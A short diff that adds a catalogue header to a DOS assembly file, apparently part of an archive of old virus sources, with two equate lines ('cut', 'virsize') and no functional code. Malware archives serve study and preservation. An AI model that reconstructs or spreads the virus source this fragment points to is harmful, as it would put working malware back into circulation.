@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      C
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 
 	cut	equ	offset len-300h
 	virsize equ	offset len-100h
